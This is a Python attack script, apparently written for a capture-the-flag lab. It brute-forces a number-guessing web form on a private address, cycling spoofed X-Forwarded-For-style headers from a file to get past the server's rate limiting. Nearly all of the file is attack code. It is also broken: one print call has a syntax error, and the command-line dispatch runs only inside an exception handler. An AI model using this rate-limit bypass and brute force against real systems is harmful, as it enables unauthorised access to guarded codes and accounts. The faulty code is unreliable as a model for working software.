#!/usr/bin/env python3


import requests,sys
import colorama
from colorama import Fore
import time

def test():
	url = "http://10.10.109.102:8085"
	for i in range(60):
		headers = {"X-Forwarded-By": "127.0.0.1","X-Forwarded-For": "127.0.0.1","User-Agent": f"{i}","Content-Type": "application/x-www-form-urlencoded"}
	for i in range(100):
		data = f"number={i}%0a"
		r = requests.post(url, headers=headers, data=data)
		print(Fore.RED + f"Trying Number: {i}")
		if "Oh no! How unlucky. Spin the wheel and try again." not in r.text:
			print(r.text)
			print(Fore.YELLOW + f"Found Number: {i}")




def brute():
	#proxies = {"http" "127.0.0.1:8080"} uncoment if u want to play around with burp
	# BTW add proxies=proxies in the request to activate the proxies
	url = 'http://10.10.109.102:8085'
	with open("headers", "r") as file:
		content = file.readlines()
		stuff = [x.strip().replace("b", "") for x in content]
		for header in stuff:
			headers = {header: "127.0.0.1", "Content-Type": "application/x-www-form-urlencoded", "Host": "10.10.109.102:8085"}
			for i in range(10000,99999):
				data = {"number": i}
				r = requests.post(url, headers=headers, data=data, verify=False, timeout=30)
				print(Fore.RED + f"Trying Header And Number: {header} {i}")
				if "rate limit execeeded" in r.text:
					print(Fore.YELLOW + f"Failed Header: {header}")
					break
				elif "Oh no! How unlucky. Spin the wheel and try again." in r.text:
					pass
				
				elif "Oh no! How unlucky. Spin the wheel and try again." not in r.text and "rate limit execeeded" not in r.text:
					print(Fore.YELLOW + f"Found Header And Number: {header} {i}")
					print(r.text)
					file.close()
					break




def __init__():
	try:
		if sys.argv[1] == None:
			print(Fore.YELLOW "Use --help or -h For The Help Menu")
	except:
		print(Fore.RED + "SomeThing Fucked Up!")		
		if sys.argv[1] == "--help" or sys.argv[1] == "-h":
			print(Fore.YELLOW + "OPTIONS: brute")
		
		elif sys.argv[1] == "brute" or sys.argv[1] == "Brute":
			brute()	




__init__()						
